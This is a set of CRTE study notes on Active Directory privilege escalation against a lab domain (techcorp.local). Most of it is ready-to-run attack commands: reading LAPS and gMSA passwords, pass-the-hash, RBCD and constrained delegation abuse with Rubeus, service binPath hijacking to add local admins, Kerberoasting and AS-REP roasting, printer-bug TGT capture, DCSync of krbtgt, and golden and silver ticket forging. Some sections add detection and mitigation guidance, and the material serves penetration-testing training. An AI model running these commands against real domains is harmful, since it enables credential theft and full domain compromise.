# AD Privilege Escalation - CRTE

## Overview
Advanced Active Directory privilege escalation techniques for CRTE certification.

> Some content is the same as in CRTP. See [CRTP AD Privilege Escalation](https://johnermac.github.io/notes/crtp/domprivesc/) for overlapping content.

**Sources**:
- [johnermac.github.io](https://johnermac.github.io/review/crte/)
- [slytechroot/CRTO-CRTP-CRTE](https://github.com/slytechroot/CRTO-CRTP-CRTE)
- [francescolonardo/CRTE-Preparation](https://github.com/francescolonardo/CRTE-Preparation)

## LAPS

**LAPS (Local Administrator Password Solution)** provides centralized storage of local users passwords in AD with periodic randomizing.

> It mitigates the risk of lateral escalation that results when customers have the same administrative local account and password combination on many computers.

**Key Points**:
- Storage in clear text, transmission is encrypted (Kerberos)
- Configurable using GPO
- Access control for reading clear text passwords using ACLs
- Only Domain Admins and explicitly allowed users can read the passwords

**Detection**:
On a computer, if LAPS is in use, a library `AdmPwd.dll` can be found in:
```
C:\Program Files\LAPS\CSE\ directory.
```

### Find Users Who Can Read LAPS Passwords

**PowerView**:
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_}
```

**Using Active Directory module**:
```powershell
Get-LapsPermissions.ps1
```

**Using LAPS module** (can be copied across machines):
```powershell
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

### Read LAPS Passwords

**PowerView**:
```powershell
Get-DomainObject -Identity <targetmachine$> | select -ExpandProperty ms-mcs-admpwd
```

**Active Directory module**:
```powershell
Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

**LAPS module**:
```powershell
Get-AdmPwdPassword -ComputerName <targetmachine>
```

## gMSA

A **group Managed Service Account (gMSA)** provides automatic password management, SPN management and delegated administration for service accounts across multiple servers.

> Use of gMSA is recommended to protect from Kerberoast type attacks!

**Key Points**:
- A 256 bytes random password is generated and is rotated every 30 days
- When an authorized user reads the attribute `msds-ManagedPassword` the gMSA password is computed
- Only explicitly specified principals can read the password blob
- Even the **Domain Admins can't read it by default**

### Find gMSA Accounts

**Using ADModule**:
```powershell
Get-ADServiceAccount -Filter *
```

**Using PowerView**:
```powershell
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```

### Read Principals Allowed to Retrieve Password

The attribute **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob.

**ADModule**:
```powershell
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

### Extract and Decode gMSA Password

The attribute **msDS-ManagedPassword** stores the password blob in binary form of MSDS-MANAGEDPASSWORD_BLOB.

Once we have compromised a principal that can read the blob, use ADModule to read and DSInternals to compute NTLM hash:

```powershell
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

> The **CurrentPassword** attribute in the $decodedpwd contains the clear-text password but cannot be typed!

### Pass the Hash of gMSA

Passing the NTLM hash of the gMSA, we get privileges of the gMSA:

```powershell
sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078
```

> We can access the services and machines (server farms) that the account has access to

### Defense - gMSA
> See [AD Defense](../crtp/ad-defense.md) for detailed detection and mitigation

**Detection**:
- Monitor for msDS-ManagedPassword attribute reads
- Monitor for unauthorized PrincipalsAllowedToRetrieveManagedPassword access
- Security Event ID 4662 - Monitor for gMSA password retrieval

**Mitigation**:
- Limit who can read gMSA passwords (PrincipalsAllowedToRetrieveManagedPassword)
- Use gMSA instead of regular service accounts (automatic password rotation)
- Monitor for unauthorized gMSA access
- Regularly audit gMSA permissions

## Golden gMSA

**gMSA password is calculated by leveraging the secret stored in KDS root key object**

We need following attributes of the KDS root key to compute the Group Key Envelope (GKE):
- cn
- msKds-SecretAgreementParam
- msKds-RootKeyData
- msKds-KDFParam
- msKds-KDFAlgorithmID
- msKds-CreateTime
- msKds-UseStartTime
- msKds-Version
- msKds-DomainID
- msKds-PrivateKeyLength
- msKds-PublicKeyLength
- msKds-SecretAgreementAlgorithmID

**Key Points**:
- Once we compute the GKE for the associated KDS root key we can generate the password offline
- Only privilege accounts such as Domain Admins, Enterprise Admins or SYSTEM can retrieve the KDS root key
- Once the KDS root key is compromised we can't protect the associated gMSAs accounts
- Golden gMSA can be used to retrieve the information of gMSA account, KDS root key and generate the password offline

### Defense - Golden gMSA
> See [AD Defense](../crtp/ad-defense.md) for detailed detection and mitigation

**Detection**:
- Monitor for KDS root key access
- Security Event ID 4662 - Monitor for KDS root key attribute reads
- Monitor for offline password generation attempts

**Mitigation**:
- Limit who can access KDS root key (Domain Admins, Enterprise Admins, SYSTEM only)
- Monitor for KDS root key compromise
- If KDS root key is compromised, rotate all associated gMSA accounts
- Use least privilege for KDS root key access

## Constrained Delegation (Kerberos Only)

> It requires an additional forwardable ticket to invoke S4U2Proxy.

**Key Point**:
- We cannot use S4U2Self as the service doesn't have TRUSTED_TO_AUTH_FOR_DELEGATION value configured

### Abuse Kerberos Only Configuration with RBCD

We can leverage RBCD to abuse Kerberos Only configuration:

1. Create a new Machine Account
2. Configure RBCD on the machine configured with Constrained Delegation
3. Obtain a TGS/Service Ticket for the machine configured with Constrained Delegation by leveraging the newly created Machine Account
4. Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step

### Enumerate Constrained Delegation

**ADModule**:
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### Create Machine Account

Since **ms-DS-MachineAccountQuota is set to 10** for all domain users, any domain user can create a new Machine Account and join the same in the current domain.

**Using Powermad.ps1**:
```powershell
. C:\AD\Tools\Powermad\Powermad.ps1
New-MachineAccount -MachineAccount studentcompX
```

### Configure RBCD

**Using ADModule** (assuming we already compromised us-mgmt):
```powershell
Set-ADComputer -Identity us-mgmt$ -PrincipalsAllowedToDelegateToAccount studentcompX$ -Verbose
```

### Obtain TGS/Service Ticket

**Get hash of machine account**:
```powershell
C:\AD\Tools\Rubeus.exe hash /password:P@ssword@123
```

**Request S4U ticket**:
```powershell
C:\AD\Tools\Rubeus.exe s4u /impersonateuser:administrator /user:studentcompX$ /rc4:D3E5739141450E529B07469904FE8BDC /msdsspn:cifs/us-mgmt.us.techcorp.local /nowrap
```

**Request forwardable TGS**:
```powershell
C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxjCCBsKgAwIBBaEDAgEWoo... /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2 /msdsspn:cifs/us-mssql.us.techcorp.local /altservice:http /nowrap /ptt
```

**Access the target**:
```powershell
winrs -r:us-mssql.us.techcorp.local cmd.exe
```

### Defense - Constrained Delegation (Kerberos Only)
> See [AD Defense - Unconstrained Delegation](../crtp/ad-defense.md#defense---unconstrained-delegation) and [AD Defense - ACL Attacks](../crtp/ad-defense.md#defense---acl-attacks) for detailed detection and mitigation

**Detection**:
- Security Event ID 4769 - Monitor for S4U2Self/S4U2Proxy requests
- Monitor for RBCD configuration changes
- Monitor for machine account creation abuse

**Mitigation**:
- Limit who can configure RBCD
- Monitor for unauthorized machine account creation
- Restrict ms-DS-MachineAccountQuota
- Use least privilege for service accounts

### Defense - LAPS
> See [AD Defense - Secure Local Administrators](../crtp/ad-defense.md#secure-local-administrators) for detailed detection and mitigation

**Detection**:
- Monitor for ms-mcs-AdmPwd attribute reads
- Security Event ID 4662 - Monitor for LAPS password retrieval
- Monitor for unauthorized LAPS permissions

**Mitigation**:
- Limit who can read LAPS passwords (ACLs on OUs)
- Use LAPS for all domain-joined machines
- Regularly audit LAPS permissions
- Monitor for unauthorized LAPS access

## Tools
- **PowerView** - Enumeration and ACL checks
- **Active Directory Module** - Native AD cmdlets
- **DSInternals** - Password blob decoding
- **Rubeus** - Kerberos ticket manipulation
- **Powermad** - Machine account creation
- **Mimikatz** - Pass the hash

## Local Privilege Escalation via Service Abuse

**PowerUp**

```powershell
PS C:\AD\Tools> Import-Module C:\AD\Tools\PowerUp.ps1
PS C:\AD\Tools> Invoke-AllChecks
PS C:\AD\Tools> Invoke-ServiceAbuse -Name ALG -UserName us\studentuser51 -Verbose
```

**AccessChk**

```powershell
PS C:\AD\Tools> C:\AD\Tools\AccessChk\accesschk64.exe -uwcqv 'studentuser51' *
PS C:\AD\Tools> sc config ALG binPath= "net localgroup administrators us\studentuserx /add"
```

## Domain Privilege Escalation via Group/ACL Abuse

**Enumerate group memberships recursively**

```powershell
function Get-ADPrincipalGroupMembershipRecursive ($u) { 
    @(Get-ADPrincipalGroupMembership -Identity $u | select -ExpandProperty distinguishedName) + 
    @(Get-ADPrincipalGroupMembership -Identity $u | foreach { Get-ADPrincipalGroupMembershipRecursive $_.distinguishedName }) 
}
PS C:\AD\Tools> Get-ADPrincipalGroupMembershipRecursive 'studentuser51'
```

**Find interesting ACLs for groups**

```powershell
PS C:\AD\Tools> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
```

**Add user to group with GenericAll rights**

```powershell
PS C:\AD\Tools> Add-ADGroupMember -Identity MachineAdmins -Members studentuser51 -Verbose
```

**Access machine with new group membership**

```powershell
PS C:\Users\studentuser51> winrs -r:us-mgmt cmd
```

## Kerberos Attacks

### Kerberoasting Attack

**Find service accounts**

```powershell
PS C:\AD\Tools> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

**Kerberoast with Rubeus**

```powershell
C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

**Crack with John**

```powershell
john.exe --wordlist=wordlist.txt hashes.txt
```

### Targeted Kerberoasting Attack

**Target specific SPN**

```powershell
.\\Rubeus.exe kerberoast /spn:"MSSQLSvc/sqlserver.organicsecurity.local:1433" /user:dcorp\\sqladmin /domain:organicsecurity.local /dc:dc.organicsecurity.local format:hashcat /outfile:mssqlsvc_tgs.hash
```

### AS-REP Roasting

**Find users without preauth**

```powershell
PS C:\AD\Tools> Get-DomainUser -PreauthNotRequired -Verbose
```

**Request AS-REP**

```powershell
.\\Rubeus.exe asreproast
.\\Rubeus.exe asreproast /format:hashcat /user:user01 /outfile:hash.txt
```

**Crack the hash**

```powershell
hashcat.exe -a 0 -m 18200 asrep-roast.hash wordlist.txt
```

### Unconstrained Delegation & Printer Bug Abuse

**Find computers with unconstrained delegation**

```powershell
PS C:\AD\Tools> Get-NetComputer -Unconstrained | select cn
```

**Monitor for TGTs**

```powershell
C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
```

**Printer Bug (force DC to connect)**

```powershell
PS C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

**Extract and use TGT**

```powershell
C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:<Base64EncodedTicket>
```

**Perform DCSync**

```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit"
```

### Constrained Delegation Abuse

**Find constrained delegation**

```powershell
PS C:\AD\Tools> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

**Abuse with Rubeus**

```powershell
C:\Users\studentuser51>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```

**Access target machine**

```powershell
C:\Users\studentuserx> winrs -r:us-mssql.us.techcorp.local cmd.exe
```

### RBCD (Resource-based Constrained Delegation) Abuse

**Find computer with Write permissions**

```powershell
PS C:\AD\Tools> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
```

**Set RBCD**

```powershell
PS C:\Windows\system32> Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose
```

**Get machine account hash**

```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn%" "exit"
```

**Request S4U ticket**

```powershell
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:student51$ /aes256:cbf97cf2b854bee5b66abdbe6dde4256bb5eb445ef97e783d4cdc4d01476e605 /impersonateuser:administrator /msdsspn:CIFS/us-helpdesk.us.techcorp.local /altservice:HTTP /ptt
```

**Access target machine**

```powershell
C:\Users\studentuser51> winrs -r:us-helpdesk cmd
```

### Golden Ticket Attack

**Extract krbtgt hash**

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

**Create Golden Ticket**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /id:500 /groups:512 /ptt"'
```

### Silver Ticket Attack

**Create Silver Ticket**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:target.domain.local /service:CIFS /rc4:<service_account_hash> /ptt"'
```

## Last Updated
January 2025
